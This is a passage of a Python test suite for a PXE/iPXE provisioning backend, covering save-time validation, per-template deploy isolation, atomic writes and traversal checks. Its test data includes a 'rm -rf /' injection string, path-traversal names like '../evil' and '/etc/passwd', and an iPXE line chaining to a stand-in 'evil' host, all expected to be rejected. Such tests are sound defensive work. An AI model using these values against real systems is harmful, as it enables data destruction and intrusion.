        from app.core.schemas import PxeProfileIn
        dc = PxeProfileIn(name="x", disk_config={"disk": "sda"}).disk_config
        ks = generate_all(_cfg(os_type="rhel", os_version="9",
                               mirror="http://mirror.example/rocky/9/BaseOS/x86_64/os/",
                               disk_config=dc))["ks.cfg"]
        self.assertEqual(_ks_disk_block(ks), LEGACY_KS_LVM)


class R2L1SizeSerialAtSaveTest(unittest.TestCase):
    """R2-L1：data_disks 的 size/serial/wwid 校验**前移到保存期**，且复用生成器那份实现。

    改前（实测）：schema 只有一道自抄的字形正则，与生成器 `_size_to_bytes` 是两套规则，
    已经漂移 —— '30P' / '30i' / 全角'３０G' 字形合法、能保存进库，到"生成配置"时才报
    "disk_config.data_disks[0].size 无法解析"。运维在保存时得不到反馈，以为存好了。
    现在 schema 保存期直接调用 generator._size_to_bytes / _safe_matcher_value 复算
    （import 同一份函数，不是第二套规则）。
    """

    PARTS = [{"mount": "/boot/efi", "size": "512M", "fstype": "fat32"},
             {"mount": "/", "size": "rest", "fstype": "ext4"}]

    def _save(self, dd):
        """返回 None = 保存成功；否则返回报错文本（pydantic 的 ValidationError 是 ValueError 子类）。"""
        from app.core.schemas import PxeProfileIn
        try:
            PxeProfileIn(
                name="t", os_type="rhel", os_version="9", admin_password="Test@123",
                disk_scheme="custom",
                disk_config={"target": {"mode": "auto"}, "layout": "custom",
                             "partitions": self.PARTS, "data_disks": [dd]})
            return None
        except ValueError as e:
            return str(e)

    def test_unparseable_size_rejected_at_save(self):
        """非法 size 在保存期即报错（改前 '30P'/'30i'/'３０G' 能存进数据库）。"""
        from app.it.pxe.generator import _size_to_bytes
        for bad in ("三十G", "30P", "30i", "３０G", "0G", "1e3", "-30G", "100%FREE"):
            with self.subTest(bad=bad):
                self.assertEqual(_size_to_bytes(bad), 0, bad)   # 生成器本来解析不了
                err = self._save({"size": bad})
                self.assertIsNotNone(err, bad)                  # 保存期必须拒
                self.assertIn("data_disks[0].size 解析不了", err, bad)
                self.assertIn(repr(bad), err, bad)
        # 极大纯数字：_size_to_bytes 会 OverflowError（今天要等生成接口才炸成 500），
        # 保存期同样按"解析不了"拒（422），不把溢出漏成保存期 500。
        huge = "9" * 400
        err = self._save({"size": huge})
        self.assertIsNotNone(err)
        self.assertIn("data_disks[0].size 解析不了", err)
        self.assertIn(huge[:20], err)

    def test_parseable_sizes_pass_at_save(self):
        """合法写法保存期照常通过（含二进制/十进制/纯字节数/小写单位/带空格 GiB）。"""
        for good in ("500G", "1T", "512M", "32212254720", "30G", "30GB", "1.5G",
                     "30 GiB", "30k", "2KB", "3.5G"):
            with self.subTest(good=good):
                self.assertIsNone(self._save({"size": good}), good)

    def test_save_acceptance_never_exceeds_generator_parseability(self):
        """防漂移性质：凡是保存期放行的 size，生成器那份解析必然解析得动。

        这是 R2-L1 的本质断言 —— schema 不再有自己的"能不能用"标准，解析对错只认
        `_size_to_bytes` 一份裁决；将来生成器解析规则怎么改，这里自动跟着收口。
        """
        from app.it.pxe.generator import _size_to_bytes
        corpus = ["30G", "500M", "1T", "512M", "32212254720", "30GB", "1.5G",
                  "30 GiB", "30k", "2KB", "3.5G", "0G", "30P", "30i", "３０G",
                  "三十G", "abc", "30GB x", "30G G", "1e3", "-30G", "100%FREE"]
        for v in corpus:
            with self.subTest(size=v):
                err = self._save({"size": v})
                if err is None:
                    self.assertGreater(_size_to_bytes(v), 0, v)  # 放行 ⇒ 生成器解析得动
                else:
                    self.assertIn("data_disks[0].size", err, v)  # 拒绝 ⇒ 点名字段

    def test_serial_wwid_reuse_generator_whitelist(self):
        """serial/wwid 字符白名单与生成器同源：同一个函数对象、同一句报错文案。"""
        from app.core import schemas
        from app.it.pxe import generator
        # 单一实现：schema 里用的就是 generator 那份函数（不是复制粘贴的副本）
        self.assertIs(schemas._size_to_bytes, generator._size_to_bytes)
        self.assertIs(schemas._safe_matcher_value, generator._safe_matcher_value)
        for key in ("serial", "wwid"):
            with self.subTest(key=key):
                err = self._save({"size": "30G", key: 'x"; rm -rf /'})
                self.assertIsNotNone(err)
                self.assertIn(key, err)                  # 点名到字段
                self.assertIn("含非法字符", err)          # 文案来自生成器那份实现
        # 合法值照旧放行
        self.assertIsNone(self._save({"size": "30G", "serial": "S3Z1NB0K123456"}))
        self.assertIsNone(self._save({"size": "30G", "wwid": "naa.6000c29a-1b2c-3d4e"}))
        # schema 侧保留比生成器更严的 128 长度上限（生成器没有长度上限，删掉会放宽）
        err = self._save({"size": "30G", "serial": "a" * 129})
        self.assertIsNotNone(err)
        self.assertIn("超过 128", err)

    def test_generator_layer_still_rejects_unparseable_size(self):
        """第 3 层兜底仍在（generator 行为未变）：绕过 HTTP 直接 generate_all，
        无法解析的 size 照样报"无法解析" —— 保存期前移没有移走生成期的防线。"""
        dc = {"target": {"mode": "auto"}, "layout": "custom",
              "partitions": self.PARTS, "data_disks": [{"size": "30P"}]}
        with self.assertRaises(ValueError) as cm:
            generate_all(_cfg(os_type="rhel", os_version="9",
                              mirror="http://mirror.example/rocky/9/BaseOS/x86_64/os/",
                              disk_config=dc))
        self.assertIn("data_disks[0].size 无法解析", str(cm.exception))
        self.assertIn("'30P'", str(cm.exception))


class DeployIsolationTest(unittest.TestCase):
    """E1：部署按模板隔离 + 原子落盘（修掉"共享引导文件"的竞态）。

    背景（实测，不是推断）：deploy_files 原先**忽略 pid**，所有模板的
    boot.ipxe / user-data / ks.cfg / meta-data 都落在同一批扁平路径上。
      · 两个部署同时进行 → 机器抓到的 boot.ipxe 与 user-data 来自**不同模板**
        （实测 VM140 装成了 CentOS kickstart，而且两边都不报错）；
      · 更糟的是"任何没登记的机器，都会被按**最后一次部署的模板**装机" ——
        不该动的机器被重新分区。

    这里不 mock 被测代码：路径拼接、原子替换、目录结构都是真的，
    只把"需要 Linux + root"的副作用（is_linux / sudo_ok / ensure_dirs /
    write_conf / dhcp_control）换掉。
    """

    ANSWER = "http://10.0.0.1:8000/pxe/serve"

    def setUp(self):
        import os
        import tempfile
        from unittest import mock

        from app.it.pxe import server

        self.os = os
        self.mock = mock
        self.server = server
        self._tmp = tempfile.TemporaryDirectory()
        self.web = os.path.join(self._tmp.name, "pxe-web")
        self.tftp = os.path.join(self._tmp.name, "tftp")
        os.makedirs(self.web)
        os.makedirs(self.tftp)
        self.write_conf = mock.Mock(return_value=True)
        self.dhcp_control = mock.Mock(
            return_value={"ok": True, "action": "restart", "msg": "ok", "running": True}
        )
        for target, attr, value in (
            (server, "WEB_ROOT", self.web),
            (server, "TFTP_ROOT", self.tftp),
            (server._dhcp, "is_linux", lambda: True),
            (server._dhcp, "sudo_ok", lambda: True),
            (server._dhcp, "ensure_dirs", lambda dirs=None: []),
            (server._dhcp, "write_conf", self.write_conf),
            (server._dhcp, "dhcp_control", self.dhcp_control),
            # R3：部署前的预检按"是不是容器"决定要不要跑（容器里必须走宿主机重载握手）。
            # 这里固定成"非容器"，让预检走它自己的跳过分支 —— 测试是 hermetic 的，
            # 绝不能在跑用例时去碰真实的 /etc/dnsmasq.d/opstk-pxe.conf。
            (server._dhcp, "_in_container", lambda: False),
            # R4：落盘前的红线检查会去读**宿主机的真实网络事实**（默认路由网卡、
            # /sys/class/net）。容器与宿主机共享网络命名空间，所以不隔离的话，
            # 生成器默认的 `interface=eth0` 会被真机事实判成占位值而拒绝 ——
            # 那与本类要测的"路径隔离/原子落盘"无关，却会让用例随宿主环境漂移。
            # 红线逻辑本身由 test_ztp_deploy.py 专门覆盖（含 PXE 侧的接入点）。
            (server._dhcp, "check_dhcp_conf_safety", lambda *a, **k: (True, "")),
        ):
            p = mock.patch.object(target, attr, value)
            p.start()
            self.addCleanup(p.stop)
        self.addCleanup(self._tmp.cleanup)

    # ── 辅助 ──

    def _cfg(self, **kw):
        kw.setdefault("admin_password", "Test@123")
        kw.setdefault("iso_url", "http://10.0.0.1:8000/pxe/iso/test.iso")
        kw.setdefault("http_root", self.ANSWER)
        kw.setdefault("server_ip", "10.0.0.1")
        return PxeConfig(**kw)

    def _rhel_cfg(self, **kw):
        kw.setdefault("kernel_path", "rhel/9/vmlinuz")
        kw.setdefault("initrd_path", "rhel/9/initrd.img")
        kw.setdefault("mirror", "http://mirror.example/rocky/9/BaseOS/x86_64/os/")
        kw.setdefault("os_type", "rhel")
        kw.setdefault("os_version", "9")
        return self._cfg(**kw)

    def _answer(self, pid):
        return self.ANSWER + "/profiles/" + pid

    def _install(self, mac, hostname="w"):
        return [{"mac": mac, "hostname": hostname}]

    def _path(self, *rel):
        return self.os.path.join(self.web, *rel)

    def _read(self, *rel):
        with open(self._path(*rel), encoding="utf-8") as f:
            return f.read()

    def _make_media(self, os_type, version, initrd="initrd"):
        """把 kernel/initrd 放到**扁平**媒体路径上（就像 extract_from_iso 做的那样）。"""
        d = self._path(os_type, version)
        self.os.makedirs(d, exist_ok=True)
        for f in ("vmlinuz", initrd):
            with open(self.os.path.join(d, f), "w", encoding="utf-8") as fh:
                fh.write("media\n")

    def _assert_served_urls_exist(self, text, min_urls=2):
        """引导脚本里每个 /pxe/serve/ URL 都必须在磁盘上真实存在。

        这是"隔离没有把媒体搬走"的机械复算：媒体只存在于扁平路径
        (<web_root>/<os_type>/<version>/)，只要 URL 能解析到文件就说明没被隔离。
        """
        checked = 0
        for url in re.findall(r"https?://[^\s\"']+", text):
            if "/pxe/serve/" not in url:
                continue          # /pxe/iso/ 是另一条挂载，不在本测试范围
            rel = url.split("/pxe/serve/", 1)[1].rstrip("/")
            self.assertTrue(
                self.os.path.isfile(self.os.path.join(self.web, *rel.split("/"))),
                "引导脚本引用了不存在的文件：" + url,
            )
            checked += 1
        self.assertGreaterEqual(checked, min_urls, "没校验到 URL，测试是空的：" + text)

    def _snapshot(self):
        out = []
        for root, _dirs, names in self.os.walk(self._tmp.name):
            for n in names:
                out.append(self.os.path.relpath(self.os.path.join(root, n), self._tmp.name))
        return sorted(out)

    # ── 1. 两个模板并发部署互不覆盖 ──

    def test_two_templates_concurrent_do_not_clobber(self):
        import threading

        pid_a, pid_b = "a" * 32, "b" * 32
        mac_a, mac_b = "00:11:22:33:44:55", "aa:bb:cc:dd:ee:ff"
        self._make_media("ubuntu", "22.04", initrd="initrd")
        self._make_media("rhel", "9", initrd="initrd.img")
        files_a = generate_all(self._cfg(answer_root=self._answer(pid_a)), self._install(mac_a, "web-01"))
        files_b = generate_all(self._rhel_cfg(answer_root=self._answer(pid_b)), self._install(mac_b, "db-01"))

        res = {}

        def _deploy(key, files, pid):
            res[key] = self.server.deploy_files(files, pid)

        ts = [threading.Thread(target=_deploy, args=("A", files_a, pid_a)),
              threading.Thread(target=_deploy, args=("B", files_b, pid_b))]
        for t in ts:
            t.start()
        for t in ts:
            t.join()
        self.assertTrue(res["A"]["ok"], res["A"])
        self.assertTrue(res["B"]["ok"], res["B"])

        a_boot = self._read("profiles", pid_a, "boot", "00-11-22-33-44-55.ipxe")
        b_boot = self._read("profiles", pid_b, "boot", "aa-bb-cc-dd-ee-ff.ipxe")
        # 各自指向**自己模板**的应答文件，且完全不含对方的任何前缀
        self.assertIn("cloud-config-url=" + self._answer(pid_a)
                      + "/user-data/00-11-22-33-44-55/user-data", a_boot)
        self.assertIn("inst.ks=" + self._answer(pid_b) + "/ks/aa-bb-cc-dd-ee-ff/ks.cfg", b_boot)
        self.assertNotIn(pid_b, a_boot)
        self.assertNotIn(pid_a, b_boot)
        # 应答文件内容也没被对方污染（Ubuntu autoinstall vs RHEL kickstart）
        a_ud = self._read("profiles", pid_a, "user-data", "00-11-22-33-44-55", "user-data")
        b_ks = self._read("profiles", pid_b, "ks", "aa-bb-cc-dd-ee-ff", "ks.cfg")
        self.assertIn("autoinstall:", a_ud)
        self.assertNotIn("kickstart", a_ud.lower())
        self.assertIn("Kickstart", b_ks)
        self.assertNotIn("autoinstall", b_ks)
        # 媒体仍在扁平路径上，且引导脚本引用的文件都真实存在
        self.assertIn("kernel " + self.ANSWER + "/ubuntu/22.04/vmlinuz", a_boot)
        self.assertIn("kernel " + self.ANSWER + "/rhel/9/vmlinuz", b_boot)
        self._assert_served_urls_exist(a_boot)
        self._assert_served_urls_exist(b_boot)

    def test_deploy_A_then_B_leaves_A_intact_and_bootable(self):
        """先部署 A、再部署 B：A 的引导脚本逐字节不变，且仍指向有效媒体路径。"""
        pid_a, pid_b = "1" * 32, "2" * 32
        mac_a = "00:11:22:33:44:55"
        self._make_media("ubuntu", "22.04", initrd="initrd")
        self._make_media("centos", "9", initrd="initrd.img")
        files_a = generate_all(self._cfg(answer_root=self._answer(pid_a)), self._install(mac_a, "web-01"))
        files_b = generate_all(
            self._rhel_cfg(os_type="centos", answer_root=self._answer(pid_b)),
            self._install("aa:bb:cc:dd:ee:ff", "db-01"),
        )
        self.server.deploy_files(files_a, pid_a)
        a_before = self._read("profiles", pid_a, "boot", "00-11-22-33-44-55.ipxe")
        self.server.deploy_files(files_b, pid_b)
        a_after = self._read("profiles", pid_a, "boot", "00-11-22-33-44-55.ipxe")
        self.assertEqual(a_before, a_after, "B 的部署改动了 A 的引导脚本")
        self.assertEqual(a_after, files_a["boot/00-11-22-33-44-55.ipxe"])
        self._assert_served_urls_exist(a_after)
        # A 的应答文件也在，且是 A 的内容
        self.assertIn("autoinstall:", self._read("profiles", pid_a, "user-data",
                                                 "00-11-22-33-44-55", "user-data"))

    # ── 2. 隔离不改媒体 URL（上一版就是栽在这里） ──

    def test_isolation_does_not_move_media_urls(self):
        """只有应答文件的 URL 变；kernel/initrd/ISO 与改造前逐字一致。"""
        flat = generate_all(self._cfg(), self._install("00:11:22:33:44:55"))
        iso = generate_all(self._cfg(answer_root=self._answer("p1")),
                           self._install("00:11:22:33:44:55"))
        key = "boot/00-11-22-33-44-55.ipxe"
        media_prefix = ("kernel " + self.ANSWER + "/ubuntu/22.04/vmlinuz"
                        " root=/dev/ram0 initrd=initrd")
        for files in (flat, iso):
            menu = files[key]
            k = [l for l in menu.splitlines() if l.startswith("kernel")][0]
            self.assertTrue(k.startswith(media_prefix), k)
            self.assertIn("url=http://10.0.0.1:8000/pxe/iso/test.iso", k)
            self.assertIn("initrd " + self.ANSWER + "/ubuntu/22.04/initrd", menu)
        # 差异**只**出现在应答文件的 URL 上
        self.assertIn("cloud-config-url=" + self.ANSWER
                      + "/user-data/00-11-22-33-44-55/user-data", flat[key])
        self.assertIn("cloud-config-url=" + self._answer("p1")
                      + "/user-data/00-11-22-33-44-55/user-data", iso[key])
        self.assertNotEqual(flat["dnsmasq.conf"], iso["dnsmasq.conf"])
        self.assertIn("dhcp-boot=tag:fw-menu-00-11-22-33-44-55," + self._answer("p1")
                      + "/boot/00-11-22-33-44-55.ipxe", iso["dnsmasq.conf"])

    def test_api_media_helpers_unaffected_by_isolation(self):
        """api 层的媒体路径映射（_default_media / _serve_url / _local_served_path）不变。"""
        from app.api import pxe as api_pxe

        class _P:
            os_type = "ubuntu"
            os_version = "22.04"

        self.assertEqual(
            api_pxe._default_media(_P()),
            ("ubuntu/22.04/vmlinuz", "ubuntu/22.04/initrd", "ubuntu/22.04/installer.squashfs"),
        )
        self.assertEqual(
            api_pxe._serve_url(self.os.path.join(api_pxe.WEB_ROOT, "rocky-9.4", "BaseOS"), "10.0.0.1"),
            "http://10.0.0.1:8000/pxe/serve/rocky-9.4/BaseOS/",
        )
        self.assertEqual(
            self.os.path.normpath(api_pxe._local_served_path("http://10.0.0.1:8000/pxe/serve/rocky-9.4/BaseOS/")),
            self.os.path.normpath(self.os.path.join(api_pxe.WEB_ROOT, "rocky-9.4", "BaseOS")),
        )
        # 路径穿越防护照旧
        self.assertEqual(api_pxe._local_served_path("http://x/pxe/serve/../etc"), "")
        self.assertEqual(
            self.os.path.normpath(api_pxe._local_served_path(
                "http://10.0.0.1:8000/pxe/serve/profiles/p1/user-data")),
            self.os.path.normpath(self.os.path.join(api_pxe.WEB_ROOT, "profiles", "p1", "user-data")),
        )

    def test_answer_root_only_changes_answer_paths(self):
        """api 层装配：answer_root 只影响 answer_root 字段，媒体路径一字不动。"""
        from app.api import pxe as api_pxe
        from app.core import models

        p = models.PxeProfile(id="p1", name="t", os_type="ubuntu", os_version="22.04",
                              admin_user="ops")
        base = api_pxe._to_pxeconfig(p, server_ip="10.0.0.1", http_root=self.ANSWER)
        iso = api_pxe._to_pxeconfig(p, server_ip="10.0.0.1", http_root=self.ANSWER,
                                    answer_root=self._answer("p1"))
        for attr in ("http_root", "kernel_path", "initrd_path", "squashfs_path",
                     "iso_url", "mirror", "stage2", "server_ip"):
            self.assertEqual(getattr(base, attr), getattr(iso, attr), attr)
        self.assertEqual(base.answer_root, "")
        self.assertEqual(iso.answer_root, self._answer("p1"))

    # ── 3. pid / 文件名的路径校验 ──

    def test_pid_traversal_absolute_and_junk_rejected(self):
        """pid 里的 ../ 与绝对路径必须**被拒**（不是被静默脱敏成另一个目录）。"""
        bad = ["../evil", "..", ".", "/etc", "/", "a/b", "a\\b", "..\\evil", "",
               None, "a" + chr(10) + "b", "a;b", "a b", "a'b", "p1/../../etc", ".hidden"]
        for pid in bad:
            with self.subTest(pid=pid):
                with self.assertRaises(ValueError):
                    self.server.safe_pid(pid)
        # 通过 deploy_files 也必须硬失败，且不产生任何副作用（连目录都不建）
        before = self._snapshot()
        res = self.server.deploy_files(generate_all(self._cfg()), "../evil")
        self.assertFalse(res["ok"])
        self.assertTrue(res["errors"])
        self.assertFalse(self.os.path.exists(self.os.path.join(self._tmp.name, "evil")))
        self.assertEqual(self._snapshot(), before)
        self.write_conf.assert_not_called()
        # 合法 pid 照常（生成器白名单字符集）
        self.assertEqual(self.server.safe_pid("Ab12-_"), "Ab12-_")

    def test_web_dest_rejects_illegal_keys(self):
        base = self._path("profiles", "p1")
        self.assertEqual(self.server._web_dest(base, "boot/aa-bb.ipxe"),
                         self.os.path.join(base, "boot", "aa-bb.ipxe"))
        for bad in ("../evil", "/etc/passwd", "\\evil", "a\\b", ".", "", "..",
                    "a/../../evil", "../../x", "boot/..", "a//b", "./x",
                    "a" + chr(10) + "b", "a b", "a;b"):
            with self.subTest(name=bad):
                self.assertIsNone(self.server._web_dest(base, bad))

    def test_illegal_file_key_fails_loudly(self):
        """非法文件名 → 硬失败，且绝不更新/重启 dnsmasq（不留坏配置）。"""
        files = dict(generate_all(self._cfg()))
        files["../evil.ipxe"] = "chain http://evil/x\n"
        res = self.server.deploy_files(files, "d" * 32)
        self.assertFalse(res["ok"])
        self.assertTrue(any("非法文件路径" in e for e in res["errors"]), res["errors"])
        self.assertFalse(self.os.path.exists(self.os.path.join(self._tmp.name, "evil.ipxe")))
        self.write_conf.assert_not_called()
        self.dhcp_control.assert_not_called()

    # ── 4. 失败可判定 + 原子落盘 ──

    def test_atomic_replace_keeps_old_file_and_leaves_no_tmp(self):
        """原子落盘：替换失败时旧文件必须完好，不留 .tmp 垃圾，且不动 dnsmasq。"""
        self.assertTrue(self.server.deploy_files({"boot.ipxe": "OLD-CONTENT\n"}, "")["ok"])
        old = self._read("boot.ipxe")
        self.write_conf.reset_mock()
        self.dhcp_control.reset_mock()
        with self.mock.patch.object(self.os, "replace",
                                    side_effect=OSError("simulated replace failure")):
            res = self.server.deploy_files({"boot.ipxe": "NEW-CONTENT\n"}, "")
        self.assertFalse(res["ok"])
        self.assertTrue(any("写入失败" in e for e in res["errors"]), res["errors"])
        self.assertEqual(self._read("boot.ipxe"), old, "旧文件必须原样保留")
        self.assertEqual(
            [f for f in self.os.listdir(self.web) if ".tmp." in f], [],
            "临时文件必须被清掉",
        )
        self.write_conf.assert_not_called()
        self.dhcp_control.assert_not_called()

    def test_dnsmasq_write_failure_and_restart_failure_are_reported(self):
        files = generate_all(self._cfg())
        self.write_conf.return_value = False
        res = self.server.deploy_files(files, "")
        self.assertFalse(res["ok"])
        self.assertTrue(any("dnsmasq config" in e for e in res["errors"]), res["errors"])
        self.dhcp_control.assert_not_called()   # 配置都没写成，就不该再重启

        self.write_conf.return_value = True
        self.dhcp_control.return_value = {"ok": False, "action": "restart",
                                          "msg": "unit failed", "running": False}
        res2 = self.server.deploy_files(files, "")
        self.assertFalse(res2["ok"])
        self.assertTrue(any("重启失败" in e for e in res2["errors"]), res2["errors"])

    # ── 5. 未登记机器的默认（显式、安全、与模板无关） ──

    def test_unregistered_mac_gets_explicit_safe_default(self):
        from app.it.pxe.generator import UNREGISTERED_DEFAULT_MARK

        pid_a, pid_b = "a" * 32, "b" * 32
        files_a = generate_all(self._cfg(answer_root=self._answer(pid_a)),
                               self._install("00:11:22:33:44:55"))
        files_b = generate_all(self._rhel_cfg(answer_root=self._answer(pid_b)),
                               self._install("aa:bb:cc:dd:ee:ff"))
        # 默认菜单与模板无关 → 逐字节相同，不存在"谁最后部署谁说了算"
        self.assertEqual(files_a["boot.ipxe"], files_b["boot.ipxe"])
        self.assertIn(UNREGISTERED_DEFAULT_MARK, files_a["boot.ipxe"])
        self.assertNotIn("autoinstall", files_a["boot.ipxe"])
        self.assertNotIn("inst.ks=", files_a["boot.ipxe"])
        self.assertNotIn("kernel ", files_a["boot.ipxe"])
        # dnsmasq：未登记的走扁平 boot.ipxe；已登记的各自指向本模板目录下的菜单
        self.assertIn("dhcp-boot=tag:fw-menu-def," + self.ANSWER + "/boot.ipxe",
                      files_a["dnsmasq.conf"])
        self.assertIn("dhcp-boot=tag:fw-menu-00-11-22-33-44-55," + self._answer(pid_a)
                      + "/boot/00-11-22-33-44-55.ipxe", files_a["dnsmasq.conf"])
        # 落盘后：扁平默认菜单就是那份安全菜单（后部署的 B 没把它改成"按 B 装"）
        self.assertTrue(self.server.deploy_files(files_a, pid_a)["ok"])
        self.assertTrue(self.server.deploy_files(files_b, pid_b)["ok"])
        self.assertEqual(self._read("boot.ipxe"), files_a["boot.ipxe"])
        # 两个模板的菜单/应答文件都在，互不覆盖
        self.assertTrue(self.os.path.isfile(self._path("profiles", pid_a, "boot",
                                                       "00-11-22-33-44-55.ipxe")))
        self.assertTrue(self.os.path.isfile(self._path("profiles", pid_b, "boot",
                                                       "aa-bb-cc-dd-ee-ff.ipxe")))

    def test_no_installs_keeps_legacy_flat_menu(self):
        """向后兼容：模板**没有**装机记录时，默认菜单仍是本模板的装机菜单（既有行为）。"""
        pid = "c" * 32
        self._make_media("ubuntu", "22.04", initrd="initrd")
        files = generate_all(self._cfg(answer_root=self._answer(pid)))
        self.assertIn("autoinstall", files["boot.ipxe"])
        self.assertIn("cloud-config-url=" + self._answer(pid) + "/user-data", files["boot.ipxe"])
        res = self.server.deploy_files(files, pid)
        self.assertTrue(res["ok"], res)
        self.assertIn("autoinstall", self._read("boot.ipxe"))
        self.assertEqual(self._read("boot.ipxe"), self._read("profiles", pid, "boot.ipxe"))
        self._assert_served_urls_exist(self._read("boot.ipxe"))
        # 显式告警（不是静默地让未登记机器按本模板装）
        self.assertTrue(any("WARNING" in ln for ln in res["log"]), res["log"])
        # 有装机记录时不再有这条告警（默认菜单已变成安全菜单）
        res2 = self.server.deploy_files(
            generate_all(self._cfg(answer_root=self._answer(pid)),
                         self._install("00:11:22:33:44:55")), pid)
        self.assertTrue(res2["ok"], res2)
        self.assertFalse(any("WARNING" in ln for ln in res2["log"]), res2["log"])

    def test_deploy_without_pid_keeps_flat_paths(self):
        """pid="" 逐字保持既有扁平行为（老调用方 / 存量部署升级后不受影响）。"""
        files = generate_all(self._cfg())
        res = self.server.deploy_files(files)
        self.assertTrue(res["ok"], res)
        self.assertEqual(res["scope"], "")
        for key in files:
            if key == "dnsmasq.conf":
                continue
            self.assertTrue(
                self.os.path.isfile(self.os.path.join(self.web, *key.split("/"))), key)
        self.assertFalse(self.os.path.isdir(self._path("profiles")))
        self.assertTrue(all("profiles" not in f for f in res["files_written"]))


    def test_many_templates_concurrent_no_clobber_no_partial(self):
        """8 个模板真并发（线程）各部署 3 轮：全部 ok、每个引导脚本逐字节等于自己那份。

        这是"共享引导文件竞态"的直接回归测试：所有部署都要同时更新那份全局默认菜单
        （扁平 boot.ipxe），而各自的 profiles/<pid>/ 必须互不干扰。
        """
        import threading

        n = 8
        pids = ["%032d" % i for i in range(n)]
        mac = "00:11:22:33:44:55"
        plan = []
        for i, pid in enumerate(pids):
            files = generate_all(self._cfg(answer_root=self._answer(pid)),
                                 self._install(mac, "vm%02d" % i))
            plan.append((pid, files))
        results = {}

        def _run(pid, files):
            results[pid] = [self.server.deploy_files(files, pid)["ok"] for _ in range(3)]

        ts = [threading.Thread(target=_run, args=(pid, files)) for pid, files in plan]
        for t in ts:
            t.start()
        for t in ts:
            t.join()
        for pid, files in plan:
            self.assertTrue(all(results[pid]), (pid, results[pid]))
            self.assertEqual(
                self._read("profiles", pid, "boot", "00-11-22-33-44-55.ipxe"),
                files["boot/00-11-22-33-44-55.ipxe"], pid,
            )
        # 全局默认菜单是"与模板无关"的安全菜单，谁最后写都一样
        self.assertEqual(self._read("boot.ipxe"), plan[0][1]["boot.ipxe"])
        self.assertEqual([f for f in self.os.listdir(self.web) if ".tmp." in f], [])

    def test_deploy_to_host_wiring_and_loud_failure(self):
        """api 层装配（deploy_to_host）：
          · http_root 保持扁平 → 媒体 URL 不动；answer_root 指到 profiles/<pid>（与落盘前缀一致）；
          · pid 含 ../ → 400；
          · 部署 ok=False → 抛 500（不能把"指向不存在文件"的配置当成功返回）；
          · 非 Linux（supported=False）保持既有的优雅降级（不抛错）。
        """
        import asyncio

        from fastapi import HTTPException

        from app.api import pxe as api_pxe
        from app.core import models
        from app.core.schemas import PxeGenerateIn

        pid = "e" * 32
        p = models.PxeProfile(id=pid, name="t", os_type="ubuntu", os_version="22.04",
                              admin_user="ops", admin_password_enc=None, root_password_enc=None,
                              ssh_keys=[], disk_scheme="lvm", disk_config={}, net_mode="dhcp",
                              net_config={}, mirror="", extra_packages=[], post_script="",
                              remark="", timezone="Asia/Shanghai", locale="en_US.UTF-8",
                              keyboard="us")
        db = self.mock.AsyncMock()
        db.get = self.mock.AsyncMock(return_value=p)
        # 新增的"DB 回落查装机记录"（§5.29 修复）：这里给"查不到记录"的结果，
        # 保持本用例原有的装配意图 —— 它验的是接线与失败处理，per-MAC 隔离另有专门用例。
        _res = self.mock.MagicMock()
        _res.scalars.return_value.all.return_value = []
        db.execute = self.mock.AsyncMock(return_value=_res)
        body_kw = dict(server_ip="10.0.0.1", iso_url="http://10.0.0.1:8000/pxe/iso/test.iso")

        captured = {}

        def _fake_deploy(files, pid=""):
            captured["files"] = files
            captured["pid"] = pid
            return {"ok": True, "supported": True, "errors": [], "log": [], "scope": pid}

        with self.mock.patch.object(self.server, "deploy_files", _fake_deploy), \
                self.mock.patch.object(api_pxe, "_safe_decrypt", lambda enc: "Test@123"):
            res = asyncio.run(api_pxe.deploy_to_host(pid, PxeGenerateIn(**body_kw), db))
        self.assertTrue(res["ok"])
        self.assertEqual(captured["pid"], pid)
        menu = captured["files"]["boot.ipxe"]
        # 媒体必须仍在扁平路径上（上一版就是把这里改成 profiles/<pid>/… 才打断生产的）
        self.assertIn("kernel " + self.ANSWER + "/ubuntu/22.04/vmlinuz", menu)
        self.assertIn("initrd " + self.ANSWER + "/ubuntu/22.04/initrd", menu)
        self.assertIn("url=http://10.0.0.1:8000/pxe/iso/test.iso", menu)
        # 应答文件被隔离到 profiles/<pid>（与 deploy_files 的落盘前缀一致）
        self.assertIn("cloud-config-url=" + self._answer(pid) + "/user-data", menu)

        # pid 穿越 / 注入：400，且根本不进生成/部署
        for bad_pid in ("../evil", "/etc/passwd", "..", "p1/../../etc", "a" + chr(10) + "b",
                        "a;b", "a b"):
            with self.subTest(pid=bad_pid):
                with self.mock.patch.object(api_pxe, "_safe_decrypt", lambda enc: "Test@123"):
                    with self.assertRaises(HTTPException) as ctx:
                        asyncio.run(api_pxe.deploy_to_host(bad_pid, PxeGenerateIn(**body_kw), db))
                self.assertEqual(ctx.exception.status_code, 400)

        # 部署失败：必须 500 + 明确原因
        with self.mock.patch.object(
                self.server, "deploy_files",
                lambda files, pid="": {"ok": False, "supported": True,
                                       "errors": ["disk full"], "log": []}), \
                self.mock.patch.object(api_pxe, "_safe_decrypt", lambda enc: "Test@123"):
            with self.assertRaises(HTTPException) as ctx:
                asyncio.run(api_pxe.deploy_to_host(pid, PxeGenerateIn(**body_kw), db))
        self.assertEqual(ctx.exception.status_code, 500)
        self.assertIn("disk full", ctx.exception.detail)

        # 非 Linux：保持优雅降级（ok=False + log，由前端提示去下载 ZIP）
        with self.mock.patch.object(
                self.server, "deploy_files",
                lambda files, pid="": {"ok": False, "supported": False,
                                       "errors": ["not linux"], "log": ["Linux only"]}), \
                self.mock.patch.object(api_pxe, "_safe_decrypt", lambda enc: "Test@123"):
            res2 = asyncio.run(api_pxe.deploy_to_host(pid, PxeGenerateIn(**body_kw), db))
        self.assertFalse(res2["ok"])
        self.assertIn("Linux only", res2["log"])

    def test_layout_conflict_between_base_and_per_mac_answers(self):
        """`user-data`（基准应答）与 `user-data/<mac>/…`（按 MAC 应答）不可能共存于同一路径。

        旧代码在扁平布局下遇到这种键集合会直接抛异常（部署 500）。现在显式处理：
        跳过基准文件（有装机记录时默认菜单已是不装系统的安全菜单，不再引用它），
        保留 dnsmasq 真正下发给已登记机器的按 MAC 那份，并且整个过程 ok=True。
        """
        files = generate_all(self._cfg(), self._install("00:11:22:33:44:55"))
        self.assertIn("user-data", files)                          # 生成器照旧产出（兼容 /generate）
        self.assertIn("user-data/00-11-22-33-44-55/user-data", files)
        res = self.server.deploy_files(files, "")
        self.assertTrue(res["ok"], res)
        self.assertTrue(any("Skip: user-data" in ln for ln in res["log"]), res["log"])
        self.assertTrue(self.os.path.isfile(self._path("user-data", "00-11-22-33-44-55", "user-data")))
        # 反向迁移：先有"按 MAC 的目录"，再部署不含装机记录的模板（需要 user-data 是文件）
